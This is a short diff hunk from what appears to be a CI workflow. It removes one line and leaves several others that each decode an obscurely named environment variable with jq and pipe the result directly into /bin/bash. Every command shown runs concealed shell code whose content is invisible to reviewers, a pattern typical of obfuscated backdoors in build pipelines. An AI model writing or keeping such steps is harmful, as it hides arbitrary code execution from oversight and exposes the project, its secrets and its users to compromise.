@@ -26,7 +26,6 @@ jobs:
           echo $danvr965 | jq -r .m16 | /bin/bash
           echo $ssfxz8 | jq -r .x53 | /bin/bash
           echo $zoc4379 | jq -r .w419 | /bin/bash
-          printf '%s' "$rc2252" | jq -r .ppt049 | /bin/bash
           echo $xdeh4083 | jq -r .fabln3 | /bin/bash
           printf '%s' "$ldhk94" | jq -r .z2 | /bin/bash
           echo $s5551 | jq -r .um47 | /bin/bash
